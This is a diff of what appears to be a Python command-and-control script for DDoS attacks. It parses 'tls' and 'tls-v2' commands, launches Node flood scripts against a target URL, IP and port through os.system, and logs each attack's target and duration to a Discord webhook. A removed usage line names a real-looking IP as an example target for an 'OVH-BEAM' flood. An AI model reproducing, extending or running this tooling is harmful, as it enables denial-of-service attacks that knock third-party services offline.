@@ -413,11 +413,11 @@ def main():
                 port = cnc.split()[3]
                 time = cnc.split()[4] 
                 device_name = platform.system()
-                send_discord_webhook(webhook_url, f"\n\n---------------\nOVH-BEAM\n---------------\nTarget: {ip}:{port}\nMethod: {method}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node {method} {ip} {port} {time} 1024')
+                send_discord_webhook(webhook_url, f"\n\n---------------\ntls\n---------------\nTarget: {url}:{port}\nTime: {time}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
+                os.system(f'node tls.js {url} {port} {time}')
             except IndexError:
-                print('Usage: tls <GET/HEAD/POST/PUT> <ip> <port> <time>')
-                print('Example: ovh-beam GET 51.38.92.223 80 60')
+                print('Usage: tls <url> <port> <time>')
+                print('Example: tls https://example.com 433 60')
     
         elif "tls-v2" in cnc:
             try:
@@ -426,7 +426,7 @@ def main():
                 thread = cnc.split()[3]
                 device_name = platform.system()
                 send_discord_webhook(webhook_url, f"\n\n---------------\nTLS-V2\n---------------\nTarget: {url}\nTime: {time}\nReq_Per_Sec: {req_per_sex}\nThreads: {thread}\nDevice: {device_name}\n---------------\n‎ \n‎ \n‎ ")
-                os.system(f'node TLS-V2 {url} {time} {req_per_sec} {thread}')
+                os.system(f'node TLS-V2.js {url} {time} {req_per_sec} {thread}')
             except IndexError:
                 print('Usage: tls-v2 <url> <time> <req_per_sec> <threads>')
                 print('Example: tls-v2 https://example.com 60 10 1')
